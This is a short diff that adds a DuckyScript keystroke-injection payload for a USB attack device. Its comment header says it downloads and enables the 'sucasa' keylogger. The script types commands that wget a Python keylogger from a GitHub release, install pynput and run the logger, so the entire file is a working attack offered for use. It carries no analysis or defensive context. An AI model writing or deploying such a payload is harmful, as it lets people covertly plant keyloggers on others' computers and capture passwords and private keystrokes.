@@ -1,0 +1,12 @@
+REM Author: JAM
+REM Description: Downloads and enables the sucasa keylogger
+REM Version: 1.0
+REM Category: Execution
+STRING wget https://github.com/JessiMcKissick/sucasa-keylogger/releases/download/betas/sucasa.py
+ENTER
+DELAY 750
+STRING pip install pynput
+ENTER
+DELAY 500
+STRING python3 sucasa.py
+ENTER
